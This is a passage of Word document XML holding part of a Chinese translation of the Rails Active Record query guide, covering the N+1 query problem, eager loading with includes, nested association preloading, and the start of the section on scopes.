        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4056"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="0F04C56C" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="29B81EB8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clients = Client.limit(10)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="177F3876" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06A5C284" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clients.each</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|client|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2023E58C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  puts client.address.postcode</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C29EA0D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="45168BC3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">第一眼看去，这个代码没什么问题。不幸的是：它的问题在于这段语句执行的查询次数。上面的代码总共执行了 1 （找出 10 条 client 记录） + 10 （每次加载一次 address 记录） = </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 次查询。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CFC9547" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>N + 1 查询问题的解决方案</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50F78BAD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Record 允许你提前指定是否需要加载所有的 association 。你可以在调用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.find</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 时候用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>includes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 来指定它。如果使用了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>includes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法， 那 Active Record 保证在最少次数内加载所有的指定的 associations 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B63F3E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">再来看上面的问题，我们可以在使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Client.all</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 时预先加载 address 。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5616"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="59431CEE" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="41A50DBB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clients - Client.includes(:address).limit(10)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="740CA176" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="239B269A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>client.each</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|client|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1224A9CE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  puts client.address.postcode</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2392FEBB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7EB9BDDC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">相对于之前的代码的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>11</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 次查询，以上的代码只需要执行 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 次查询。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6911"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="51FAE864" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="36B5943D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>* FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>clients LIMIT 10</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F04B09D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>addresses.* FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>addresses</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21F869AD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(addresses.client_id IN</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(1,2,3,4,5,6,7,8,9,10))</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="21B2164D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>13.1 预加载多个 Association</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="480E56DF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Record 允许你在一次 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.find</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 调用中使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>include</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法通过数组，映射表或者嵌套的数组/映射表的方式来加载任意多个 association 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69278D1D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>13.1.1 多个 Association 的数组</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4416"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="77C9E70E" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2D5D8527" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="447117567"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post.includes(:category, :comments)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="17B205A4" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>它会载入所有的 post 和与之关联的 category 和 comment 记录。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="238F1A4E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>13.1.2 嵌套的 Association 映射表</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7991"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="0AA32E97" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="43F0DEE1" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="774255892"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Category.includes(:posts</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; [{:comments</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :guest}, :tags).find(1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="313F09F5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>它会返回 id 为 1 的 category 记录并预先加载与之相关联的 post 记录，与 post 相关联的 tag 和 comment 记录和与 comment 相关联的 guest 记录。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A6DD132" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>13.2 为预加载的 Association 指定条件表达式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41FF5929" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">尽管 Active Record 像给 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>joins</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 一样给预加载的 association 也提供了指定条件表达式的方法，但我们建议使用 </w:t>
      </w:r>
      <w:hyperlink r:id="rId279" w:anchor="12" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>joins</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> 来代替。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C0C463E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">然后，如果你还是要这样做，那么你可以想你平时一样使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>where</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 来达到目的。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6936"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7115A350" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7DEFBC3E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="65956949"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post.includes(:comments).where("comments.visible", true)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="66271997" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">它会产生一个包含 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>LEFT OUTER JOIN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 查询语句，而 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>joins</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句产生的语句包含的是 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>INNER JOIN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7506690E" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="050D947E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1165783356"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"posts"."id"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>AS</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>t0_r0, ... "comments"."updated_at"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>AS</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>t1_r5 FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"posts"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>LEFT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>OUTER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>JOIN</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"comments"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ON</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>"comments"."post_id"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= "posts"."id"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>WHERE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(comments.visible = 1)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="11F942A3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果没有 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>where</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句，那会生成两条普通的查询语句。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="227E2721" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果在 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>includes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的查询时， post 没有任何 comment ，那依然会加载所有的 post 记录。如果使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>joins</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> （使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>INNER</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>JOIN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ），那就不会返回任何记录。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CAFF481" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>14 作用域（ Scope ）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6543D8B2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">作用域让你可以定义常用的 Arel 查询以便于 association 对象和 model 对象的调用。在这些作用域中，你可以使用之前提到过的任何方法，比如： </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>where</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>joins</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>includes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 。所有的作用域方法都会返回一个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::Relation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 对象，这个对象可以进一步调用其它方法（包括其它作用域）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76DD0AB7" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">定义一个简单的作用域，我们只需在类里面给 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>scope</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法传递我们希望执行的 Arel 查询就可以了：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
